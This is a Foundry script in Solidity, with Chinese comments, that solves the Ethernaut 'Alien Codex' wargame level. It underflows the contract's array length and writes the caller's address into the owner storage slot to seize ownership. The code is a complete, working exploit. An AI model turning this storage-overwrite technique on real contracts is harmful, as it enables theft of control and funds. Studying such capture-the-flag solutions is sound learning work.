// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexAttackScript is Script {
    function run() external {
        address alienCodexLevel = 0xc18A69197AD51923fBE66BE95fb4d9Bb98D4FAef;

        vm.startBroadcast();

        IAlienCodex target = IAlienCodex(alienCodexLevel);

        // 1) 先满足 contacted 修饰符
        target.makeContact();

        // 2) 长度下溢: codex.length 从 0 减到 2^256 - 1
        //    动态数组现在覆盖整个 storage 空间
        target.retract();

        // 3) 计算让 codex[i] 落在 slot 0 (owner 所在槽) 的索引
        //    数据起始槽 = keccak256(abi.encode(1))
        //    需要 startSlot + i ≡ 0 (mod 2^256)
        //    => i = 2^256 - startSlot
        uint256 startSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index;
        unchecked {
            index = type(uint256).max - startSlot + 1;
        }

        // 4) 把 player 地址写到 slot 0
        //    slot 0 布局: [contact(1B) | owner(20B)]
        //    bytes32(uint256(uint160(player))) 把地址放到低 20 字节,正好覆盖 owner
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));
        target.revise(index, newOwner);

        vm.stopBroadcast();

        console.log("new owner:", target.owner());
        console.log("expected: ", msg.sender);
    }
}
